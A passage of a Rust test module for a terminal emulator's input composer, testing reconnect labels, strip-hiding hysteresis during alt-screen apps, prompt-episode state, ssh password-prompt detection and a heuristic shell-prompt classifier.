    /// F1 (ssh-reestablish) — the Reconnecting lane's label goldens: the
    /// auto supervision keeps the historical "reconnecting…"; the manual
    /// unlimited ladder reports its attempts honestly through every phase
    /// (pre-first-rung, waiting between rungs, attempt in flight).
    #[test]
    fn retry_lane_label_strings() {
        assert_eq!(retry_lane_label(0, 0), "reconnecting\u{2026}");
        assert_eq!(retry_lane_label(0, 2), "retrying \u{2014} first attempt in 2s");
        assert_eq!(
            retry_lane_label(7, 30),
            "retrying \u{2014} attempt 7 \u{b7} next in 30s"
        );
        assert_eq!(retry_lane_label(7, 0), "retrying \u{2014} attempt 7\u{2026}");
        // The unlimited ladder's numbers keep rendering plainly (no cap in
        // the wording — there is none).
        assert_eq!(
            retry_lane_label(240, 30),
            "retrying \u{2014} attempt 240 \u{b7} next in 30s"
        );
    }

    /// Fix a — REAL egui round-trip (headless `Context::run_ui`, the Bug C
    /// test pattern) for the Dead lane's Enter-to-relaunch: SessionEnded +
    /// terminal-owned keyboard + EMPTY draft + Enter ⇒ `out.restore` (the
    /// same RestartTerminal path as the mouse verb); a non-empty draft's
    /// Enter is NOT consumed as a restore; overlays and foreign focus stay
    /// inert; asleep and reconnecting lanes keep their existing ownership
    /// (Enter never wakes, never cancels); a running terminal never
    /// restores.
    #[test]
    fn dead_enter_relaunches() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        let recs: Vec<BlockRec> = Vec::new();
        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 564.0));
        let enter = egui::Event::Key {
            key: Key::Enter,
            physical_key: None,
            pressed: true,
            repeat: false,
            modifiers: Modifiers::NONE,
        };
        let frame = |st: &mut ComposerState,
                     b: &TermBackend,
                     running: bool,
                     overlay: bool,
                     events: Vec<egui::Event>| {
            let raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(
                    Pos2::ZERO,
                    Pos2::new(800.0, 600.0),
                )),
                events,
                ..Default::default()
            };
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        b,
                        &recs,
                        0, // hookless: the never-hooked dead ssh tab
                        running,
                        false,
                        overlay,
                        FontId::monospace(13.0),
                        None,
                        None,
                    ));
                });
            });
            out.unwrap()
        };

        let mut st = ComposerState {
            mode: ComposerMode::Raw(RawReason::Dead),
            term_focused: true,
            ..Default::default()
        };
        let o = frame(&mut st, &b, false, false, vec![enter.clone()]);
        assert!(o.restore, "Dead + focus + empty draft + Enter ⇒ restore");
        // Non-empty draft: Enter keeps its ordinary path.
        st.draft = "queued text".into();
        let o = frame(&mut st, &b, false, false, vec![enter.clone()]);
        assert!(!o.restore, "a draft's Enter must NOT be consumed as restore");
        st.draft.clear();
        // Overlay open: the popup owns Enter.
        let o = frame(&mut st, &b, false, true, vec![enter.clone()]);
        assert!(!o.restore, "overlay owns Enter");
        // Keyboard owned elsewhere this frame.
        st.term_focused = false;
        let o = frame(&mut st, &b, false, false, vec![enter.clone()]);
        assert!(!o.restore, "foreign focus: Enter untouched");
        st.term_focused = true;
        // Asleep lane: waking stays the explicit Wake ▸ click (SLEEP inv.5).
        st.asleep = true;
        st.mode = ComposerMode::Raw(RawReason::Asleep);
        let o = frame(&mut st, &b, false, false, vec![enter.clone()]);
        assert!(!o.restore && !o.wake, "asleep: Enter never wakes");
        st.asleep = false;
        // Reconnecting lane: supervision owns the lane (Cancel is a click).
        st.mode = ComposerMode::Raw(RawReason::Dead);
        st.reconnecting = true;
        let o = frame(&mut st, &b, false, false, vec![enter.clone()]);
        assert!(
            !o.restore && !o.cancel_reconnect,
            "reconnecting: Enter neither restores nor cancels"
        );
        st.reconnecting = false;
        // A running terminal never restores on Enter.
        st.mode = ComposerMode::Raw(RawReason::NoPrompt);
        let o = frame(&mut st, &b, true, false, vec![enter]);
        assert!(!o.restore, "running: never fires");
    }

    /// C2 — `strip_hidden` truth table (hidden ⇔ the terminal owns the
    /// reclaimed rows — this one predicate drives paint AND geometry): the
    /// strip collapses ONLY for the stable alt lane (≥ HIDE_AFTER); every
    /// precedence lane (asleep `Wake ▸`, dead `Restore ▸`, reconnecting
    /// `Cancel`), the pre-hysteresis window, a missing latch, Compose, and
    /// the alt falling edge (same tick, before any clock maintenance) keep
    /// the reserved band. Hover is NOT an input — the peek overlays, it
    /// never resizes.
    #[test]
    fn strip_hidden_truth_table() {
        let t0 = Instant::now();
        let now = t0 + HIDE_AFTER; // alt_since = t0 ⇒ exactly HIDE_AFTER old
        let mut st = ComposerState {
            mode: ComposerMode::Raw(RawReason::AltScreen),
            alt_since: Some(t0),
            ..Default::default()
        };
        // Stable alt ⇒ collapsed: the grid gains the rows.
        assert!(strip_hidden(&st, true, true, false, now));
        // Younger than HIDE_AFTER ⇒ reserved (startup alt blips never
        // resize — the hysteresis IS the flap debounce).
        assert!(!strip_hidden(
            &st,
            true,
            true,
            false,
            now - Duration::from_millis(50)
        ));
        // No latch stamped yet (tick hasn't run) ⇒ reserved.
        st.alt_since = None;
        assert!(!strip_hidden(&st, true, true, false, now));
        st.alt_since = Some(t0);
        // Alt falling edge: reserved the SAME tick, even with the clock
        // still stamped — the lane is no longer AltScreen (the strip and
        // the rows are back the instant the TUI exits).
        assert!(!strip_hidden(&st, true, false, false, now));
        // Sleep during alt (freeze-frame): asleep wins the lane ⇒ reserved
        // (the resize-back happens with the freeze, never after wake).
        st.asleep = true;
        st.mode = ComposerMode::Raw(RawReason::Asleep);
        assert!(!strip_hidden(&st, true, true, false, now));
        // The one-frame Snapshot-before-tick belt (flag set, mode stale).
        st.mode = ComposerMode::Raw(RawReason::AltScreen);
        assert!(!strip_hidden(&st, false, true, false, now));
        st.asleep = false;
        // Death under alt (ssh drop during htop) ⇒ SessionEnded reserved.
        st.mode = ComposerMode::Raw(RawReason::Dead);
        assert!(!strip_hidden(&st, false, true, false, now));
        // Reconnecting wins over the dead transients ⇒ `Cancel` reserved.
        st.reconnecting = true;
        assert!(!strip_hidden(&st, false, true, false, now));
        st.reconnecting = false;
        // Pre-shell ssh auth is non-alt by definition ⇒ never collapsed.
        st.mode = ComposerMode::Raw(RawReason::NoPrompt);
        assert!(!strip_hidden(&st, true, false, false, now));
        // Compose never collapses (stale clock or not).
        st.mode = ComposerMode::Compose;
        assert!(!strip_hidden(&st, true, false, false, now));
        // The sleep pre-pass: restart_hide_clock un-collapses immediately
        // (the freeze-frame resize-back rides this).
        st.mode = ComposerMode::Raw(RawReason::AltScreen);
        st.alt_since = Some(t0);
        assert!(strip_hidden(&st, true, true, false, now));
        st.restart_hide_clock();
        assert!(!strip_hidden(&st, true, true, false, now));
    }

    /// C2 — flap debounce: an app toggling DECSET 1049 faster than
    /// HIDE_AFTER (claude shelling out, a TUI restarting) never collapses
    /// the strip, so alt flapping can produce ZERO strip-driven PTY resizes.
    #[test]
    fn alt_flap_never_collapses() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let mut t = Instant::now();
        for _ in 0..5 {
            // Alt on, held ALMOST to the deadline.
            b.advance_live(b"\x1b[?1049h\x1b[2J\x1b[Hflap");
            st.tick(&b, &recs, true, false, t);
            t += HIDE_AFTER - Duration::from_millis(20);
            st.tick(&b, &recs, true, false, t);
            assert!(
                !strip_hidden(&st, true, true, false, t),
                "sub-HIDE_AFTER alt hold must never collapse"
            );
            // Alt off: reserved instantly, clock cleared.
            b.advance_live(b"\x1b[?1049l");
            t += Duration::from_millis(10);
            st.tick(&b, &recs, true, false, t);
            assert!(!strip_hidden(&st, true, false, false, t));
            assert_eq!(st.alt_since, None);
            t += Duration::from_millis(10);
        }
        // A genuinely stable hold still collapses (the latch isn't wedged).
        b.advance_live(b"\x1b[?1049h");
        st.tick(&b, &recs, true, false, t);
        assert!(strip_hidden(&st, true, true, false, t + HIDE_AFTER));
    }

    /// Bug C — `tick` maintains the hysteresis clock from real DECSET 1049
    /// edges: rising edge stamps once (no sliding), falling edge clears,
    /// re-entry restarts the full wait; sleep mid-TUI flips the lane to
    /// Asleep (visible) without disturbing the clock.
    #[test]
    fn tick_maintains_alt_since() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.advance_live(b"\x1b[?1049h\x1b[2J\x1b[Htui frame");
        assert!(b.mode().contains(TermMode::ALT_SCREEN));
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let t0 = Instant::now();
        st.tick(&b, &recs, true, false, t0);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
        assert_eq!(st.alt_since, Some(t0), "rising edge stamps the clock");
        assert!(
            !strip_hidden(&st, true, true, false, t0),
            "not hidden before the hysteresis elapses"
        );
        // Stable alt: the stamp never slides.
        let t1 = t0 + HIDE_AFTER;
        st.tick(&b, &recs, true, false, t1);
        assert_eq!(st.alt_since, Some(t0));
        assert!(
            strip_hidden(&st, true, true, false, t1),
            "hidden once alt has been stable for HIDE_AFTER"
        );
        // Sleep mid-htop (freeze-frame path): the lane flips to Asleep —
        // visible `Wake ▸` — the clock untouched for the wake return.
        st.asleep = true;
        st.tick(&b, &recs, true, false, t1);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Asleep));
        assert!(!strip_hidden(&st, true, true, false, t1));
        st.asleep = false;
        // Falling edge clears; the strip is back the same tick.
        b.advance_live(b"\x1b[?1049l");
        let t2 = t1 + Duration::from_millis(10);
        st.tick(&b, &recs, true, false, t2);
        assert_eq!(st.alt_since, None, "falling edge clears the clock");
        assert!(!strip_hidden(&st, true, false, false, t2));
        // Re-entry restarts the full HIDE_AFTER wait.
        b.advance_live(b"\x1b[?1049h");
        let t3 = t2 + Duration::from_millis(10);
        st.tick(&b, &recs, true, false, t3);
        assert_eq!(st.alt_since, Some(t3), "re-entry restarts the hysteresis");
        assert!(!strip_hidden(&st, true, true, false, t3));
        assert!(strip_hidden(&st, true, true, false, t3 + HIDE_AFTER));
    }

    /// C2 — REAL egui hover round-trip (headless `Context::run` driving
    /// `show` with genuine PointerMoved events) pinning PEEK-IS-LOOK-ONLY:
    /// while collapsed the band exposes NO interaction surface (no history
    /// exemption rect, `clicked()` can never fire — the pixels belong to
    /// the grid); a pointer over the band raises the OVERLAY (`strip_peek`)
    /// the same frame without creating controls; un-hover drops it; and the
    /// un-collapsed frame after alt-exit restores the full strip with the
    /// pointer nowhere near the band. Exercises the exact production path:
    /// RawInput → pointer_latest_pos → peek/paint gating.
    #[test]
    fn show_peeks_without_interaction_while_collapsed() {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.advance_live(b"\x1b[?1049h\x1b[2J\x1b[Htui frame");
        assert!(b.mode().contains(TermMode::ALT_SCREEN));
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        st.tick(&b, &recs, true, false, Instant::now());
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::AltScreen));
        // Pretend the hysteresis elapsed a while ago (show() reads
        // Instant::now() internally, so backdate the latch).
        st.alt_since = Some(Instant::now() - (HIDE_AFTER + Duration::from_millis(200)));

        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 600.0));
        let frame = |st: &mut ComposerState,
                     b: &TermBackend,
                     collapsed: bool,
                     pointer: Pos2| {
            let mut raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(
                    Pos2::ZERO,
                    Pos2::new(800.0, 600.0),
                )),
                ..Default::default()
            };
            raw.events.push(egui::Event::PointerMoved(pointer));
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        b,
                        &recs,
                        1,
                        true,
                        collapsed,
                        false,
                        FontId::monospace(13.0),
                        None,
                        None,
                    ));
                });
            });
            out.unwrap()
        };

        // The caller's verdict this frame — the same predicate central and
        // layout_for evaluate (single source).
        let collapsed = strip_hidden(&st, true, true, false, Instant::now());
        assert!(collapsed, "stable alt ⇒ the grid owns the band");
        // Pointer parked in the grid: nothing painted, nothing interactive.
        let out = frame(&mut st, &b, collapsed, Pos2::new(400.0, 300.0));
        assert!(out.history_btn.is_none(), "collapsed ⇒ no exemption rect");
        assert!(!out.strip_peek, "no hover ⇒ no overlay");
        // Pointer over the band: the overlay peeks the SAME frame — and
        // stays look-only (no controls, no geometry: `collapsed` is
        // unchanged by hover, so the PTY size question can't even move).
        let out = frame(&mut st, &b, collapsed, Pos2::new(400.0, 582.0));
        assert!(out.strip_peek, "hover over the band ⇒ overlay");
        assert!(
            out.history_btn.is_none(),
            "peek is look-only: still no interaction surface"
        );
        assert!(
            strip_hidden(&st, true, true, false, Instant::now()),
            "hover must not un-collapse — peek never resizes"
        );
        // Pointer leaves the band: overlay drops.
        let out = frame(&mut st, &b, collapsed, Pos2::new(400.0, 300.0));
        assert!(!out.strip_peek, "un-hover ⇒ overlay gone");
        // TUI exits (alt falls): the predicate flips the same tick; the
        // strip is a real reserved band again, full interaction restored.
        b.advance_live(b"\x1b[?1049l");
        st.tick(&b, &recs, true, false, Instant::now());
        let collapsed = strip_hidden(&st, true, false, false, Instant::now());
        assert!(!collapsed, "alt exit ⇒ reserved band back, same tick");
        let out = frame(&mut st, &b, collapsed, Pos2::new(400.0, 300.0));
        assert!(
            out.history_btn.is_some(),
            "un-collapsed strip exposes its controls again, no hover needed"
        );
        assert!(!out.strip_peek);
    }

    /// §11 episode rules: raw input at a prompt uses the episode and
    /// dismisses an armed composer; submit spends the episode and STAYS in
    /// Compose (post-submit typeahead — the next command's keys land in the
    /// draft, never raw); the next `pre` resets; keys typed into a TUI
    /// (`at_prompt` false) do NOT use the episode.
    #[test]
    fn episode_rules() {
        let now = Instant::now();
        let mut st = ComposerState::default();

        // TUI case first: no prompt latch, raw keys are episode-free.
        st.on_raw_input(now);
        assert!(!st.episode_used);

        // pre latches; raw typing at the armed prompt wins the episode (D7).
        st.on_stream_events(1, 0, now);
        assert!(st.at_prompt_latched());
        st.mode = ComposerMode::Compose;
        st.on_raw_input(now);
        assert!(st.episode_used);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));

        // Submit: same-frame episode_used + cleared draft (D6), Compose
        // kept with the typeahead window open.
        let backend = TermBackend::new(GridSize::default());
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let (bytes, spacer) = st.submit(&backend, None, None);
        assert_eq!(bytes, b"echo hi\r");
        assert!(!spacer);
        assert!(st.draft.is_empty());
        assert!(st.episode_used);
        assert_eq!(st.mode, ComposerMode::Compose, "typeahead: never yields raw");
        assert!(st.buffering(), "submit opens the typeahead window");

        // exec clears the latch but the typeahead window HOLDS Compose (the
        // exec edge is the normal first event of every submit window)…
        st.on_stream_events(1, 1, now);
        assert!(!st.at_prompt_latched());
        assert_eq!(st.mode, ComposerMode::Compose);
        // …and the closing pre resets the episode and re-arms the latch.
        st.on_stream_events(2, 1, now);
        assert!(st.at_prompt_latched());
        assert!(!st.episode_used);
        assert_eq!(st.mode, ComposerMode::Compose);

        // A focused composer is never yanked by an external exec (inv. 4).
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.has_focus = true;
        st.on_stream_events(1, 1, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        // REWRITTEN DELIBERATELY (permanent editor): the exec edge never
        // demotes an existing Compose — unfocused/empty included (this leg
        // used to pin the "quiet dismissal" to Raw(Busy), one of the two
        // yields behind the measured re-arm gap). An external SubmitCommand
        // under an armed composer keeps the box; busy-Compose is a healthy
        // steady state and Enter queues.
        let mut st = ComposerState::default();
        st.on_stream_events(1, 0, now);
        st.mode = ComposerMode::Compose;
        st.on_stream_events(1, 1, now);
        assert_eq!(st.mode, ComposerMode::Compose, "exec edge never demotes Compose");
    }

    /// Build a backend parked at a clean captured prompt end (Bug 1 support).
    fn backend_at_clean_prompt() -> TermBackend {
        let mut b = TermBackend::new(GridSize::default());
        b.set_stream_pos(0);
        b.enable_block_scan();
        // pre hook + prompt text + 133;B, one feed → prompt_end captured with
        // the cursor sitting exactly on it (nothing typed).
        let hex: String = r#"{"e":0,"n":1,"d":"C:"}"#
            .bytes()
            .map(|b| format!("{b:02x}"))
            .collect();
        let mut data = format!("\x1b]7717;0;pre;{hex}\x07").into_bytes();
        data.extend_from_slice(b"PS C:\\> ");
        data.extend_from_slice(b"\x1b]133;B\x07");
        b.advance_live(&data);
        assert!(b.cursor_at_prompt_end());
        b
    }

    /// Bug 1 root-cause regression: with SETTLE == 0 a clean prompt arms on
    /// the SAME instant the pre+133;B are processed — no 50ms window for a
    /// fast typist's first key to fall through to the grid.
    #[test]
    fn arms_immediately_without_settle() {
        assert_eq!(SETTLE, Duration::ZERO, "settle must be zero (Bug 1)");
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
        // Same instant as the latch — must arm (grid had focus ⇒ want_focus).
        let recs: Vec<BlockRec> = Vec::new();
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Compose,
            "composer must arm with zero settle delay"
        );
        assert!(st.want_focus, "must request focus to catch the first key");
    }

    /// Hex-encode a hook payload the way the bootstrap does (token "0",
    /// matching `backend_at_clean_prompt`).
    fn hook_bytes(verb: &str, json: &str) -> Vec<u8> {
        let hex: String = json.bytes().map(|b| format!("{b:02x}")).collect();
        format!("\x1b]7717;0;{verb};{hex}\x07").into_bytes()
    }

    /// v0.1.1 (the ssh password-phase plaintext exposure, root 1b):
    /// D2C::Reset replaces the backend — its counters restart at 0 — so
    /// on_reset/on_exited must resync the baselines. Without the resync the
    /// respawn's FIRST hookless output frame (the `Password:` bytes) read
    /// as a counter edge and falsely latched `at_prompt`. Fails against the
    /// pre-fix code.
    #[test]
    fn reset_resyncs_hook_counters() {
        let now = Instant::now();
        let mut st = ComposerState::default();
        // The old lifetime saw real hook traffic.
        st.on_stream_events(3, 2, now);
        assert!(st.at_prompt_latched());
        st.on_reset();
        assert!(!st.at_prompt_latched());
        // Fresh backend, fresh counters: (0,0) is the ORIGIN, not an edge.
        st.on_stream_events(0, 0, now);
        assert!(
            !st.at_prompt_latched(),
            "the post-reset counter origin must never latch at_prompt"
        );
        // Symmetric on the exit path.
        let mut st = ComposerState::default();
        st.on_stream_events(5, 5, now);
        st.on_exited();
        st.on_stream_events(0, 0, now);
        assert!(!st.at_prompt_latched());
        // A REAL first pre of the new lifetime still latches.
        st.on_stream_events(1, 0, now);
        assert!(st.at_prompt_latched());
    }

    /// v0.1.1 pre-shell definition: no hook event this lifetime + no latch
    /// ⇒ pre-shell (the arm veto's input); any lifetime signal exits it.
    /// AutoArm is structurally impossible pre-shell (no latch ⇒ the gate
    /// blocks NoPrompt) — pinned here so the veto's belt never rots.
    #[test]
    fn pre_shell_state_table() {
        assert!(pre_shell(true, false, 0, 0, false));
        assert!(!pre_shell(false, false, 0, 0, false), "dead is not pre-shell");
        assert!(!pre_shell(true, true, 0, 0, false), "alt-screen is its own state");
        assert!(!pre_shell(true, false, 1, 0, false), "the first pre exits pre-shell");
        assert!(!pre_shell(true, false, 0, 1, false), "an exec exits pre-shell");
        assert!(
            !pre_shell(true, false, 0, 0, true),
            "a cold-attach latch exits pre-shell"
        );
        let mut i = raw_inputs();
        i.at_prompt = false;
        assert_eq!(gate(&i), GateVerdict::Blocked(RawReason::NoPrompt));
    }

    /// v0.1.1: the pre-shell auth-prompt detector fixtures (cursor-row text
    /// only, end-anchored; misses degrade to the generic label).
    #[test]
    fn auth_prompt_detection_fixtures() {
        use AuthPrompt::*;
        assert_eq!(detect_auth_prompt("alec@devbox's password: "), Password);
        assert_eq!(detect_auth_prompt("(user@host) Password:"), Password);
        assert_eq!(
            detect_auth_prompt("Enter passphrase for key '/home/z/.ssh/id_ed25519': "),
            Password
        );
        assert_eq!(detect_auth_prompt("PASSCODE:"), Password);
        assert_eq!(
            detect_auth_prompt(
                "Are you sure you want to continue connecting (yes/no/[fingerprint])? "
            ),
            HostKey
        );
        assert_eq!(detect_auth_prompt("Continue connecting (yes/no)? "), HostKey);
        // Negatives: shell prompts, echoes, non-anchored mentions.
        assert_eq!(detect_auth_prompt("[zany@MSI zany]$ "), None);
        assert_eq!(detect_auth_prompt("zany@MSI:~$ "), None);
        assert_eq!(detect_auth_prompt("cat password.txt"), None);
        assert_eq!(
            detect_auth_prompt("password: extra words"),
            None,
            "the colon must anchor the end of the row"
        );
        assert_eq!(
            detect_auth_prompt("time:"),
            None,
            "a bare trailing colon without a secret keyword"
        );
        assert_eq!(detect_auth_prompt(""), None);
    }

    // Bug D truth table: `nested_shell_cmd_truth_table` moved with the
    // classifier body to daemon::tracker (F1) — one implementation, one pin.

    /// Bug D: the raw-shell lane's password sub-case reads the CURSOR row
    /// only — `[sudo] password for alice:` at the cursor selects the lock
    /// line; a root prompt (or any non-password cursor row, even with
    /// `Password:` sitting in mid-scrollback output that is never passed in)
    /// selects the generic honest line.
    #[test]
    fn nested_shell_lane_line() {
        use NestedShellLine::*;
        assert_eq!(nested_shell_line("[sudo] password for alice: "), Password);
        assert_eq!(nested_shell_line("Password:"), Password);
        assert_eq!(nested_shell_line("root@devbox:/home/alice# "), Generic);
        assert_eq!(nested_shell_line("cat password.txt"), Generic);
        assert_eq!(nested_shell_line(""), Generic);
    }

    /// Bug D option (c) pin — nested-shell episode and re-attach, the exact
    /// sequence staging proved: armed → exec edge (`sudo su` submitted)
    /// drops the latch and goes Raw(Busy); the whole root-shell episode
    /// (many frames, hook counters frozen, rec never closes — its close
    /// signal IS the next tokened pre) holds Blocked(Busy); the `exit` pre
    /// edge re-latches and the F7 open-block override unblocks the gate the
    /// SAME event, even while the rec's Blocks-close round-trip is still in
    /// flight. A future gate/latch refactor that breaks the recovery path
    /// breaks this test.
    #[test]
    fn nested_shell_reattach() {
        let now = Instant::now();
        let mut st = ComposerState::default();
        // Mirror gate_inputs' F7 formula: a live latch overrules an open rec.
        let gi = |st: &ComposerState, open_rec: bool| GateInputs {
            hooked: true,
            running: true,
            alt: false,
            mouse: false,
            open_block: open_rec && !st.at_prompt_latched(),
            at_prompt: st.at_prompt_latched(),
            settled: st.at_prompt_latched(),
            cursor_clean: true,
            episode_used: st.episode_used,
            asleep: false,
        };
        // Hooked prompt: pre edge latches, gate arms.
        st.on_stream_events(1, 0, now);
        assert!(st.at_prompt_latched());
        assert_eq!(gate(&gi(&st, false)), GateVerdict::AutoArm);
        // `sudo su` submitted: exec edge — latch drops, mode Raw(Busy).
        st.on_stream_events(1, 1, now);
        assert!(!st.at_prompt_latched());
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
        // The nested-shell episode: output flows but the hook counters never
        // move (no hooks in that shell) and the rec stays open — the gate
        // must hold Blocked(Busy) for the whole visit (typing goes raw).
        for _ in 0..10 {
            st.on_stream_events(1, 1, now); // unchanged counters: no edges
            assert!(!st.at_prompt_latched());
            assert_eq!(gate(&gi(&st, true)), GateVerdict::Blocked(RawReason::Busy));
        }
        // `exit`: the login shell repaints its prompt → tokened pre edge.
        // Latch live; the F7 override unblocks the gate the same frame even
        // though the rec still reads open (Blocks round-trip in flight).
        st.on_stream_events(2, 1, now);
        assert!(st.at_prompt_latched());
        assert!(!st.episode_used, "pre edge resets the episode");
        assert_eq!(gate(&gi(&st, true)), GateVerdict::AutoArm);
    }

    // ── D2: heuristic composer in marker-silent nested shells ────────────

    /// The §5.2 classifier truth table, ported from the validated prototype
    /// (`scratchpad\d2\heur_proto.rs`, 0 failures against the docker-rig
    /// corpus): 20 real prompt positives, 16 adversarial negatives, plus the
    /// one documented residual (zsh PS2) and the cwd-parse rows.
    #[test]
    fn heur_prompt_truth_table() {
        // Positives: every shape captured live in the D2 docker rig
        // (ubuntu 24.04 / alpine 3) plus the documented default families.
        let positives: &[(&str, usize)] = &[
            ("root@0b0dbe2a869c:/#", 1),  // ubuntu root, the sudo su shape
            ("tcp@0b0dbe2a869c:~$", 1),   // ubuntu user bash
            ("bash-5.2#", 1),             // bash --norc compiled default
            ("sh-5.1$", 1),               // sh POSIX-mode user
            ("[root@rocky9 ~]#", 1),      // RHEL/Rocky root default
            ("/ #", 1),                   // alpine busybox ash root
            ("~ $", 1),                   // alpine busybox ash user
            ("0b0dbe2a869c#", 1),         // zsh default root %m%#
            ("0b0dbe2a869c%", 1),         // zsh default user
            ("user@grml ~ %", 1),         // grml/debian zsh
            ("root@0b0dbe2a869c /#", 1),  // fish default root
            ("tcp@0b0dbe2a869c />", 1),   // fish default user
            ("PS /home/tcp>", 1),         // pwsh on linux
            ("C:\\Users\\zany>", 1),      // cmd default
            ("\u{276f}", 1),              // starship/p10k multiline tail
            ("$", 1),                     // dash bare user prompt
            ("#", 1),                     // dash bare root prompt
            ("\u{279c}  ~", 1),           // oh-my-zsh robbyrussell (ends with a DIR)
            ("~/src/pulse\u{3009}", 1),   // nushell default indicator
            ("root@web-01:/var/log#", 0), // no-trailing-space custom prompt
        ];
        for (p, gap) in positives {
            assert!(looks_like_shell_prompt(p, *gap), "{p:?} must arm");
        }
        // Adversarial negatives: auth/consent prompts, output shapes, a
        // dirty prompt, the row under an echoed fake prompt, a parked
        // cursor. All must refuse — a false arm covers a live row.
        let negatives: &[(&str, usize)] = &[
            ("[sudo] password for tcp:", 1),
            ("Password:", 1),
            ("Enter passphrase for key '/root/.ssh/id':", 1),
            ("Do you want to continue? [Y/n]", 1),
            (
                "Are you sure you want to continue connecting (yes/no/[fingerprint])?",
                1,
            ),
            ("Downloading... 100%", 1),
            ("resolving deltas: 45%", 0),
            (">", 1),                                    // bash/zsh PS2 continuation
            ("cat file.txt >>", 1),                      // echoed redirect tail
            ("make[1]: Entering directory '/src'", 1),
            ("Total 15 (delta 3), reused 15 (delta 3)", 1),
            ("-- INSERT --", 1),                         // vim modeline (alt-blocked anyway)
            ("Reading package lists... Done", 1),
            ("root@0b0dbe2a869c:/# whoami", 1),          // dirty prompt = no auto-arm
            ("", 0),                                     // row under an echoed fake prompt
            ("root@box:/#", 20),                         // cursor parked away from text
        ];
        for (p, gap) in negatives {
            assert!(!looks_like_shell_prompt(p, *gap), "{p:?} must refuse");
        }
        // The 17th research negative — DOCUMENTED residual: zsh's PS2
        // renders `name> ` and classifies as a prompt. Typing there goes
        // into the continuation, functionally where raw typing would go
        // (record mislabel only, no wrong bytes).
        assert!(looks_like_shell_prompt("quote>", 1));

        // Best-effort cwd parse (the display-only `# cwd` chip).
        assert_eq!(
            heur_prompt_cwd("root@box:/var/log#").as_deref(),
            Some("/var/log")
        );
        assert_eq!(heur_prompt_cwd("tcp@host:~$").as_deref(), Some("~"));
        assert_eq!(heur_prompt_cwd("[root@rocky9 ~]#").as_deref(), Some("~"));
        assert_eq!(heur_prompt_cwd("bash-5.2#"), None, "no @ ⇒ bare sigil chip");
        assert_eq!(
            heur_prompt_cwd("C:\\Users\\zany>"),
            None,
            "a drive colon without @ never parses"
        );
        assert_eq!(heur_prompt_cwd("/ #"), None);
    }

    /// D2 test rig: a marker-silent nested-shell episode — hooked prompt
    /// latched, `sudo su` exec'd (rec open, hook counters frozen from here),
    /// the nested root prompt painted RAW (zero hook OSCs). `now` returned
    /// is the real clock at the last output stamp; tests advance simulated
    /// time from it.
    fn heur_episode_setup() -> (TermBackend, ComposerState, Vec<BlockRec>, Instant) {
        let mut b = backend_at_clean_prompt();
        let now = Instant::now();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        b.advance_live(&hook_bytes("exec", r#"{"c":"sudo su"}"#));
        pump_counters(&mut st, &b, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
        b.advance_live(b"\r\nroot@box:/# ");
        let recs = vec![BlockRec {
            epoch: 1,
            n: 0,
            cmd: "sudo su".into(),
            cwd: None,
            exit: None,
            started_ms: 0,
            ended_ms: None,
            start_off: 0,
            end_off: None,
            truncated: false,
        }];
        (b, st, recs, now)
    }

    /// D2 latch state machine: the quiet window gates the mint (with a
    /// self-scheduled wakeup); a minted latch AutoArms the unmodified gate
    /// and feeds the armed cover; any output byte disarms instantly; a
    /// dirty prompt never re-arms; a fresh clean prompt re-mints; a tokened
    /// marker edge ends the whole episode; and an ordinary busy command
    /// never runs the detector at all.
    #[test]
    fn heur_latch_lifecycle() {
        let (mut b, mut st, recs, t0) = heur_episode_setup();
        // Quiet window still running: no latch, honest Blocked(Busy), and
        // the pending mint schedules its own wakeup (the nested prompt will
        // never repaint on its own).
        let wake = st.tick(&b, &recs, true, true, t0);
        assert!(!st.heur_live(&b));
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::Busy));
        assert!(wake.is_some(), "pending mint must schedule a wakeup");
        // Quiet elapsed + prompt-shaped cursor row + cursor anchor: minted.
        let t1 = t0 + HEUR_QUIET + Duration::from_millis(100);
        st.tick(&b, &recs, true, true, t1);
        assert!(st.heur_live(&b));
        assert_eq!(st.mode, ComposerMode::Compose, "AutoArm through the gate");
        assert!(st.want_focus, "grid had focus ⇒ editor takes it");
        assert!(!st.episode_used, "a mint opens a fresh prompt episode");
        // The armed cover blanks the latched row — the detection cell IS
